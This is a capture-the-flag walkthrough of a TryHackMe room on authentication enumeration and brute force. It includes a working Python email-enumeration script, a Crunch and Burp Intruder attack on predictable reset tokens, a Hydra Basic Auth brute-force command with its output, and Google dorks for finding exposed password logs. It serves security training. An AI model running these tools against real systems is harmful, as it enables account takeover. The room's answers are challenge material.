# Enumeration & Brute Force

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
OS: N/A
Subscription type: Free
Description: Enumerate and brute force authentication mechanisms.
```

Room link: [https://tryhackme.com/room/enumerationbruteforce](https://tryhackme.com/room/enumerationbruteforce)

## Solution

### Task 1: Introduction

#### Introduction

Authentication enumeration is a fundamental aspect of security testing, concentrating specifically on the mechanisms that protect sensitive aspects of web applications; this process involves methodically inspecting various authentication components ranging from username validation to password policies and session management. Each of these elements is meticulously tested because they represent potential vulnerabilities that, if exploited, could lead to significant security breaches.

#### Objectives

By the end of this room, you will:

- Understand the significance of enumeration and how it sets the stage for effective brute-force attacks.
- Learn advanced enumeration methods, mainly focusing on extracting information from verbose error messages.
- Comprehend the relationship between enumeration and brute-force attacks in compromising authentication mechanisms.
- Gain practical experience using tools and techniques for both enumeration and brute-force attacks.

#### Pre-requisites

Before starting this room, you should have a basic understanding of the following concepts:

- Familiarity with HTTP and HTTPS, including request/response structures and common status codes.
- Experience using tools like [Burp Suite](https://tryhackme.com/module/learn-burp-suite).
- Basic proficiency in navigating and using the [Linux command line](https://tryhackme.com/module/linux-fundamentals).

-----------------------------------------------------------------------

Deploy the target VM attached to this task by pressing the green **Start Machine** button. After obtaining the machine's generated IP address, you can either use the AttackBox or your own VM connected to TryHackMe's VPN.

Add 10.10.249.105 to your `/etc/hosts` file. For example:

```text
10.10.249.105    enum.thm
```

After 3 minutes, visit `http://enum.thm` to access the machine. We recommend using the AttackBox for this room.

![THM Enum Target Web Site](Images/THM_Enum_Target_Web_Site.png)

### Task 2: Authentication Enumeration

#### Authentication Enumeration

Think of yourself as a digital detective. It's not just about picking up clues—it's about understanding what these clues reveal about the security of a system. This is essentially what authentication enumeration involves. It's like piecing together a puzzle rather than just ticking off items on a checklist.

Authentication enumeration is like peeling back the layers of an onion. You remove each layer of a system's security to reveal the real operations underneath. It's not just about routine checks; it's about seeing how everything is connected.

Identifying Valid Usernames

Knowing a valid username lets an attacker focus just on the password. You can figure out usernames in different ways, like observing how the application responds during login or password resets. For example, error messages that specify "this account doesn't exist" or "incorrect password" can hint at valid usernames, making an attacker's job easier.

Password Policies

The guidelines when creating passwords can provide valuable insights into the complexity of the passwords used in an application. By understanding these policies, an attacker can gauge the potential complexity of the passwords and tailor their strategy accordingly. For example, the below PHP code uses regex to require a password that includes symbols, numbers, and uppercase letters:

```php
<?php
$password = $_POST['pass']; // Example1
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
?>
```

In the above example, if the supplied password doesn't satisfy the policy defined in the **pattern** variable, the application will return an error message revealing the regex code requirement. An attacker might generate a dictionary that satisfies this policy.

#### Common Places to Enumerate

Web applications are full of features that make things easier for users but can also expose them to risks:

Registration Pages

Web applications typically make the user registration process straightforward and informative by immediately indicating whether an email or username is available. While this feedback is designed to enhance user experience, it can inadvertently serve a dual purpose. If a registration attempt results in a message stating that a username or email is already taken, the application is unwittingly confirming its existence to anyone trying to register. Attackers exploit this feature by testing potential usernames or emails, thus compiling a list of active users without needing direct access to the underlying database.

Password Reset Features

Password reset mechanisms are designed to help users regain access to their accounts by entering their details to receive reset instructions. However, the differences in the application's response can unintentionally reveal sensitive information. For example, variations in an application's feedback about whether a username exists can help attackers verify user identities. By analyzing these responses, attackers can refine their lists of valid usernames, substantially improving the effectiveness of subsequent attacks.

Verbose Errors

Verbose error messages during login attempts or other interactive processes can reveal too much. When these messages differentiate between "username not found" and "incorrect password," they're intended to help users understand their login issues. However, they also provide attackers with definitive clues about valid usernames, which can be exploited for more targeted attacks.

Data Breach Information

Data from previous security breaches is a goldmine for attackers as it allows them to test whether compromised usernames and passwords are reused across different platforms. If an attacker finds a match, it suggests not only that the username is reused but also potential password recycling, especially if the platform has been breached before. This technique demonstrates how the effects of a single data breach can ripple through multiple platforms, exploiting the connections between various online identities.

#### What type of error messages can unintentionally provide attackers with confirmation of valid usernames?

Hint: These occur during login attempts or other interactive processes that can reveal too much information.

Answer: Verbose Errors

### Task 3: Enumerating Users via Verbose Errors

#### Understanding Verbose Errors

Imagine you're a detective with a knack for spotting clues that others might overlook. In the world of web development, verbose errors are like unintentional whispers of a system, revealing secrets meant to be kept hidden. These detailed error messages are invaluable during the debugging process, helping developers understand exactly what went wrong. However, just like an overheard conversation might reveal too much, these verbose errors can unintentionally expose sensitive data to those who know how to listen.

Verbose errors can turn into a goldmine of information, providing insights such as:

- **Internal Paths**: Like a map leading to hidden treasure, these reveal the file paths and directory structures of the application server which might contain configuration files or secret keys that aren't visible to a normal user.
- **Database Details**: Offering a sneak peek into the database, these errors might spill secrets like table names and column details.
- **User Information**: Sometimes, these errors can even hint at usernames or other personal data, providing clues that are crucial for further investigation.

#### Inducing Verbose Errors

Attackers induce verbose errors as a way to force the application to reveal its secrets. Below are some common techniques used to provoke these errors:

1. **Invalid Login Attempts**: This is like knocking on every door to see which one will open. By intentionally entering incorrect usernames or passwords, attackers can trigger error messages that help distinguish between valid and invalid usernames. For example, entering a username that doesn’t exist might trigger a different error message than entering one that does, revealing which usernames are active.

2. **SQL Injection**: This technique involves slipping malicious SQL commands into entry fields, hoping the system will stumble and reveal information about its database structure. For example, placing a single quote (`'`) in a login field might cause the database to throw an error, inadvertently exposing details about its schema.

3. **File Inclusion/Path Traversal**: By manipulating file paths, attackers can attempt to access restricted files, coaxing the system into errors that reveal internal paths. For example, using directory traversal sequences like `../../` could lead to errors that disclose restricted file paths.

4. **Form Manipulation**: Tweaking form fields or parameters can trick the application into displaying errors that disclose backend logic or sensitive user information. For example, altering hidden form fields to trigger validation errors might reveal insights into the expected data format or structure.

5. **Application Fuzzing**: Sending unexpected inputs to various parts of the application to see how it reacts can help identify weak points. For example, tools like Burp Suite Intruder are used to automate the process, bombarding the application with varied payloads to see which ones provoke informative errors.

#### The Role of Enumeration and Brute Forcing

When it comes to breaching authentication, enumeration and brute forcing often go hand in hand:

- **User Enumeration**: Discovering valid usernames sets the stage, reducing the guesswork in subsequent brute-force attacks.
- **Exploiting Verbose Errors**: The insights gained from these errors can illuminate aspects like password policies and account lockout mechanisms, paving the way for more effective brute-force strategies.

In summary, verbose errors are like breadcrumbs leading attackers deeper into the system, providing them with the insights needed to tailor their strategies and potentially compromise security in ways that could go undetected until it’s too late.

#### Enumeration in Authentication Forms

In this [HackerOne report](https://hackerone.com/reports/1166054), the attacker was able to enumerate users using the website's Forget Password function. Similarly, we can also enumerate emails in login forms. For example, navigate to `http://enum.thm/labs/verbose_login/` and put any email address in the Email input field.

When you input an invalid email, the website will respond with "Email does not exist." indicating that the email has not been registered yet.

![VulnApp Email does not exist](Images/VulnApp_Email_does_not_exist.png)

However, if the email is already registered, the website will respond with an "Invalid password" error message, indicating that the email exists in the database but the password is incorrect.

![VulnApp Invalid password](Images/VulnApp_Invalid_password.png)

#### Automation

Below is a Python script that will check for valid emails in the target web app. Save the code below as script.py.

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

Breakdown of the script:

Imports

**requests**: A Python library for making HTTP requests. This is used to interact with the web server by sending POST requests to the target endpoint.

```python
import requests
```

Setup

**url**: The script targets the endpoint handling the login functionality of the application.

```python
url = 'http://enum.thm/labs/verbose_login/functions.php'
```

**headers**: A collection of HTTP headers is defined to mimic a typical browser request, ensuring the requests appear legitimate.

```python
headers = {
      'Host': 'enum.thm',
      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'Origin': 'http://enum.thm',
      'Connection': 'close',
      'Referer': 'http://enum.thm/labs/verbose_login/',
  }
```

Variables Initialization

**valid_emails**: An array stores email addresses confirmed to be valid.

```python
valid_emails = []
```

**invalid_error**: A string contains the specific error message used to identify invalid emails.

```python
invalid_error = 'Email does not exist'
```

Main Loop

The script reads email addresses from a provided file and checks each for validity using the `check_email` function.

```python
for email in email_list:
    check_email(email)
```

Crafting and Sending HTTP Requests

For each email, the script constructs a data dictionary that includes the email address, a placeholder password, and a command to execute the 'login' function.

```python
data = {'username': email, 'password': 'password', 'action': 'login'}
response = requests.post(url, headers=headers, data=data)
```

Response Handling

The response from the server is processed to check if the provided email exists, based on the presence of the specific error message in the JSON data

```python
if invalid_error in response.text:
    print(f"{email} is invalid.")
else:
    print(f"{email} is valid.")
    valid_emails.append(email)
```

Character Verification

Emails confirmed to exist are added to the valid_emails list, with each email's validity logged to the console.

```python
for email in valid_emails:
    print(f"Valid email found: {email}")
```

We can use a common list of emails from [this repository](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).

Once you've downloaded the payload list, use the script on the AttackBox or your own machine to check for valid email addresses.

**Note**: As a reminder, we strongly advise using the AttackBox for this task.

-----------------------------------------------------------------------

#### What is the valid email address from the list?

Hint: Try the command python3 script.py usernames_gmail.com.txt | grep -v INVALID to speed things up

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Enumeration_and_Brute_Force]
└─$ python3 script.py usernames_gmail.com.txt | grep -v INVALID
[VALID] <REDACTED>@gmail.com

Valid emails found:
<REDACTED>@gmail.com
```

Answer: `<REDACTED>@gmail.com`

### Task 4: Exploiting Vulnerable Password Reset Logic

#### Password Reset Flow Vulnerabilities

Password reset mechanism is an important part of user convenience in modern web applications. However, their implementation requires careful security considerations because poorly secured password reset processes can be easily exploited.

Email-Based Reset

When a user resets their password, the application sends an email containing a reset link or a token to the user’s registered email address. The user then clicks on this link, which directs them to a page where they can enter a new password and confirm it, or a system will automatically generate a new password for the user. This method relies heavily on the security of the user's email account and the secrecy of the link or token sent.

Security Question-Based Reset

This involves the user answering a series of pre-configured security questions they had set up when creating their account. If the answers are correct, the system allows the user to proceed with resetting their password. While this method adds a layer of security by requiring information only the user should know, it can be compromised if an attacker gains access to personally identifiable information (PII), which can sometimes be easily found or guessed.

SMS-Based Reset

This functions similarly to email-based reset but uses SMS to deliver a reset code or link directly to the user’s mobile phone. Once the user receives the code, they can enter it on the provided webpage to access the password reset functionality. This method assumes that access to the user's phone is secure, but it can be vulnerable to SIM swapping attacks or intercepts.

Each of these methods has its vulnerabilities:

- **Predictable Tokens**: If the reset tokens used in links or SMS messages are predictable or follow a sequential pattern, attackers might guess or brute-force their way to generate valid reset URLs.
- **Token Expiration Issues**: Tokens that remain valid for too long or do not expire immediately after use provide a window of opportunity for attackers. It’s crucial that tokens expire swiftly to limit this window.
- **Insufficient Validation**: The mechanisms for verifying a user’s identity, like security questions or email-based authentication, might be weak and susceptible to exploitation if the questions are too common or the email account is compromised.
- **Information Disclosure**: Any error message that specifies whether an email address or username is registered can inadvertently help attackers in their enumeration efforts, confirming the existence of accounts.
- **Insecure Transport**: The transmission of reset links or tokens over non-HTTPS connections can expose these critical elements to interception by network eavesdroppers.

#### Exploiting Predictable Tokens

Tokens that are simple, predictable, or have long expiration times can be particularly vulnerable to interception or brute force. For example, the below code is used by the vulnerable application hosted in the Predictable Tokens lab:

```php
$token = mt_rand(100, 200);
$query = $conn->prepare("UPDATE users SET reset_token = ? WHERE email = ?");
$query->bind_param("ss", $token, $email);
$query->execute();
```

The code above sets a random three-digit PIN as the reset token of the submitted email. Since this token doesn't employ mixed characters, it can be easily brute-forced.

To demonstrate this, go to `http://enum.thm/labs/predictable_tokens/`.

Navigate to the application's password reset page, input `admin@admin.com` in the Email input field, and click Submit.

The application will respond with a success message.

![VulnApp_Password_Reset](Images/VulnApp_Password_Reset.png)

For demonstration purposes, the web application uses the reset link: `http://enum.thm/labs/predictable_tokens/reset_password.php?token=123`

Notice the token is a simple numeric value. Using Burp Suite, navigate to the above URL and capture the request.

Subsequently, send the request to the Intruder, highlight the value of the token parameter, and click the **Add** payload button, as shown below.

![VulnApp Intruder Password Reset](Images/VulnApp_Intruder_Password_Reset.png)

Using the AttackBox or your own attacking VM, use Crunch to generate a list of numbers from 100 to 200. This list will be used as the dictionary in the brute-force attack.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Enumeration_and_Brute_Force]
└─$ crunch 3 3 -o otp.txt -t %%% -s 100 -e 200 
Crunch will now generate the following amount of data: 404 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 101 

crunch: 100% completed generating output
```

Go back to Intruder and configure the payload to use the generated file.

![VulnApp Intruder Password Reset 2](Images/VulnApp_Intruder_Password_Reset_2.png)

The attack will take some time to finish if you're using Burp Suite Community Edition. However, once successful, you will get a response with a much bigger content length compared to the responses with an "Invalid token" error message.

![VulnApp Intruder Password Reset 3](Images/VulnApp_Intruder_Password_Reset_3.png)

Log in to the application using the new password.

Note that most web applications use a 6-digit code instead of three. We are using a lower value in this demo because we are using the Community version of Burp Suite.

-----------------------------------------------------------------------

#### What is the flag?

Hint: Do not forget to make the password reset request BEFORE brute forcing the token.

Answer: `THM{<REDACTED>}`

### Task 5: Exploiting HTTP Basic Authentication

#### Basic Authentication in 2k24?

Basic authentication offers a more straightforward method when securing access to devices. It requires only a username and password, making it easy to implement and manage on devices with limited processing capabilities. Network devices such as routers typically utilise basic authentication to control access to their administrative interfaces. In this scenario, the primary goal is to prevent unauthorized access with minimal setup.

While basic authentication does not offer the robust security features provided by more complex schemes like OAuth or token-based authentication, its simplicity makes it suitable for environments where session management and user tracking are not required or are managed differently. For example, in devices like routers that are primarily accessed for configuration changes rather than regular use, the overhead of maintaining session states is unnecessary and could complicate device performance.

HTTP Basic Authentication is defined in [RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617), which specifies that the credentials (username and password) should be transported as a base64-encoded string within the HTTP Authorization header. This method is straightforward but not secure over non-HTTPS connections, as base64 is not an encryption method and can be easily decoded. The real threat often comes from weak credentials that can be brute-forced.

HTTP Basic Authentication provides a simple challenge-response mechanism for requesting user credentials.

![HTTP Basic Authentication](Images/HTTP_Basic_Authentication.png)

From: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication`

The Authorization header format is as follows:

```test
Authorization: Basic <credentials>
```

where `<credentials>` is the base64 encoding of `username:password`. For detailed specifications, refer to [RFC 7617](https://tools.ietf.org/html/rfc7617).

#### Exploitation

To demonstrate this, go to `http://enum.thm/labs/basic_auth/`.

![VulnApp Basic Auth Login](Images/VulnApp_Basic_Auth_Login.png)

Input any username and password in the pop-up and capture the Basic Auth Request using Burp.

![VulnApp Basic Auth Login 2](Images/VulnApp_Basic_Auth_Login_2.png)

In Burp Intruder, go to the "Positions" tab and decode the base64 encoded string in the Authorization header.

![VulnApp Basic Auth Login 3](Images/VulnApp_Basic_Auth_Login_3.png)

Once decoded, highlight the decoded string and click the Add button in the top right corner.

![VulnApp Basic Auth Login 4](Images/VulnApp_Basic_Auth_Login_4.png)

Next is configuring the payloads. Go to the Payloads tab and set the payload type to Simple list and choose your preferred wordlist. In this demo, we will use the [500-worst-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt) from SecLists. If you're using the AttackBox, you may use the same wordlist located at `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt`.

Since the header is base64 encoded, we need to add two rules in the Payload processing section. The first automatically adds a username to the password, so instead of 123456, the payload will be "admin:123456".

![VulnApp Basic Auth Login 5](Images/VulnApp_Basic_Auth_Login_5.png)

The second rule will base64 encode the combined username and password from the supplied list.

![VulnApp Basic Auth Login 6](Images/VulnApp_Basic_Auth_Login_6.png)

We should also remove the character "=" (equal sign) from the encoding because base64 uses "=" for padding. To do this, scroll down and remove the "=" sign from the list of characters in the Payload encoding section.

![VulnApp Basic Auth Login 7](Images/VulnApp_Basic_Auth_Login_7.png)

Once done, go back to the Positions tab and click the Start Attack button. The attack will take a little less than 2 minutes.

Once you get a Status code 200, it means the brute force is successful, and one of the passwords in the supplied list is working. Decode the encoded base64 string in the successful request.

![VulnApp Basic Auth Login 8](Images/VulnApp_Basic_Auth_Login_8.png)

Use the decoded base64 string to log into the application.

-----------------------------------------------------------------------

#### What is the flag?

Answer: `THM{<REDACTED>}`

#### Try using Hydra instead of Burp to brute force the password

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Enumeration_and_Brute_Force]
└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.29.85 http-get /labs/basic_auth/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 19:37:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
[DATA] attacking http-get://10.10.29.85:80/labs/basic_auth/
[80][http-get] host: 10.10.29.85   login: admin   password: <REDACTED>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-18 19:37:54
```

### Task 6: OSINT

#### Wayback URLs and Google Dorks

Digging into a web application’s past can be as revealing as examining its present:

Wayback URLs

Think of the Internet Archive's Wayback Machine (`https://archive.org/web/`) as a time machine. It lets you travel back and explore older versions of websites, uncovering files and directories that are no longer visible but might still linger on the server. These relics can sometimes provide a backdoor right into the present system.

For example, using TryHackMe as a target, we can see all of the website's past versions from 2018 to the present.

To dump all of the links that are saved in Wayback Machine, we can use the tool called `waybackurls`. Hosted in [GitHub](https://github.com/tomnomnom/waybackurls), we can easily install this on our machine by using the below commands:

**Note**: Installing this tool is out of scope for this room. It is also recommended to install this tool using your own VM.

```bash
user@tryhackme $ git clone https://github.com/tomnomnom/waybackurls
user@tryhackme $ cd waybackurls
user@tryhackme $ sudo apt install golang-go -y # This command is optional
user@tryhackme $ go build
user@tryhackme $ ls -lah
total 6.6M
drwxr-xr-x 4 user user 4.0K Jul  1 18:20 .
drwxr-xr-x 9 user user 4.0K Jul  1 18:20 ..
drwxr-xr-x 8 user user 4.0K Jul  1 18:20 .git
-rw-r--r-- 1 user user   36 Jul  1 18:20 .gitignore
-rw-r--r-- 1 user user  454 Jul  1 18:20 README.mkd
-rw-r--r-- 1 user user   49 Jul  1 18:20 go.mod
-rw-r--r-- 1 user user 5.4K Jul  1 18:20 main.go
drwxr-xr-x 2 user user 4.0K Jul  1 18:20 script
-rwxr-xr-x 1 user user 6.5M Jul  1 18:20 waybackurls
user@tryhackme $ ./waybackurls tryhackme.com
[-- snip --]
https://tryhackme.com/.well-known/ai-plugin.json
https://tryhackme.com/.well-known/assetlinks.json
https://tryhackme.com/.well-known/dnt-policy.txt
https://tryhackme.com/.well-known/gpc.json
https://tryhackme.com/.well-known/nodeinfo
https://tryhackme.com/.well-known/openid-configuration
https://tryhackme.com/.well-known/security.txt
https://tryhackme.com/.well-known/trust.txt
[-- snip --]
```

Google Dorks

This is where your savvy with search engines shines. By crafting specific search queries, known as Google Dorks, you can find information that wasn’t meant to be public. These queries can pull up everything from exposed administrative directories to logs containing passwords and indices of sensitive directories. For example:

- To find administrative panels: `site:example.com inurl:admin`
- To unearth log files with passwords: `filetype:log "password" site:example.com`
- To discover backup directories: `intitle:"index of" "backup" site:example.com`

### Task 7: Conclusion

#### Conclusion

Throughout this room, we have explored various aspects of enumeration and brute force attacks on web applications, equipping you with the knowledge and practical skills needed to conduct thorough security assessments.

#### Key Takeaways

- **Effective Enumeration**: Proper enumeration is crucial for identifying potential vulnerabilities in web applications. Using the right tools and techniques can reveal valuable information that aids in planning further attacks.
- **Brute Force Efficiency**: Optimizing brute force attacks involves creating intelligent wordlists, managing attack parameters, and avoiding detection mechanisms like rate limiting and account lockout.
- **Ethical Responsibility**: Always conduct enumeration and brute force attacks with explicit permission from the system owner. Unauthorized attacks are illegal and can have severe consequences.

For additional information, please see the references below.

## References

- [Burp suite - Documentation](https://portswigger.net/burp/documentation)
- [Burp suite - Homepage](https://portswigger.net/burp)
